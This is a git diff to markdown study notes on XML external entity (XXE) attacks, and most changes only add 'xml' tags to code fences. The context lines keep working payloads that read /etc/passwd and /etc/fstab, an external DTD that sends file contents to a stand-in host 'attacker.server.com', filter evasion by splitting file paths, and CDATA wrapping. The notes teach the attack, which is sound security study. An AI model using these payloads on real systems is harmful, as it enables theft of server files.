@@ -9,7 +9,7 @@ Extensible Markup Language is a way of structuring data similar to JSON which ha
 
 #### XML Structure && Syntax
 
-```
+```xml
 <?xml version="1.0"?>
 <Person>
 	<Name>John Smith</Name>
@@ -28,7 +28,7 @@ Entities operate like variables within the XML document where, once defined, the
 
 #### Document Type Definition (DTD)
 
-```
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE Person [
 	<!ENTITY name "John">
@@ -41,7 +41,7 @@ Entities operate like variables within the XML document where, once defined, the
 
 ##### General Entities
 
-```
+```xml
 <!ENTITY generalEntity "arbitrary">
 
 <Usage>&generalEntity;</Usage>
@@ -49,7 +49,7 @@ Entities operate like variables within the XML document where, once defined, the
 
 ##### Parameter Entities
 
-```
+```xml
 <!ENTITY % outer "<!ENTITY inner 'parameter'>">
 
 ```
@@ -59,7 +59,7 @@ Entities operate like variables within the XML document where, once defined, the
 
 ##### Predefined
 
-```
+```xml
 <specialChars>&#x3C;</specialChars>
 ```
 
@@ -92,7 +92,7 @@ Entities operate like variables within the XML document where, once defined, the
 
 ### Read System Files
 
-```
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE XXE [
 	<!ENTITY payloadEntity SYSTEM "/etc/passwd">
@@ -104,7 +104,7 @@ Entities operate like variables within the XML document where, once defined, the
 
 #### Include Entities Remotely
 
-```
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE XXE [
 	<!ENTITY payloadEntity SYSTEM "https://callback.free.beeceptor.com/test">
@@ -116,7 +116,7 @@ Entities operate like variables within the XML document where, once defined, the
 
 + Because DTDs can be passed as a URI in a `SYSTEM` call they can be loaded externally by the XML parser
 
-```
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE DTD [
 	<!ENTITY % parameter_entity "<!ENTITY secondary_entity 'PwnFunction'>">
@@ -130,7 +130,7 @@ Entities operate like variables within the XML document where, once defined, the
 
 #### External DTD (external_payload.dtd)
 
-```
+```xml
 <!ENTITY % grabPasswd SYSTEM "file:///etc/passwd">
 	<!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://attacker.server.com/?%grabPasswd;'>">
 	%wrapper;
@@ -143,7 +143,8 @@ Entities operate like variables within the XML document where, once defined, the
 + This will then send the contents of `grabPasswd` to the attack server 
 
 #### XXE Payload
-```
+
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE payload SYSTEM "http://attack.server.com/external_payload.dtd">
 <payload>&send;</payload>
@@ -152,15 +153,17 @@ Entities operate like variables within the XML document where, once defined, the
 ### Filter Evasion
 
 #### External DTD 
-```
+
+```xml
 <!ENTITY % p1 "fi">
 <!ENTITY % p2 "le:///etc/pa">
 <!ENTITY % p3 "sswd">
 <!ENTITY % combined "<!ENTITY pwnFunc SYSTEM '%p1;%p2;%p3;'>">
 ```
+
 #### Main XML
 
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 
 <!DOCTYPE xxe [
@@ -184,7 +187,7 @@ Entities operate like variables within the XML document where, once defined, the
 + The character data syntax, `<![CDATA[ <text> ]]` is a way of telling the XML parser to ignore syntactic characters that may arise within this tag
 + Consider its usage in a external DTD payload bellow
 
-```
+```xml
 <!ENTITY % file SYSTEM "file:///etc/fstab">
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
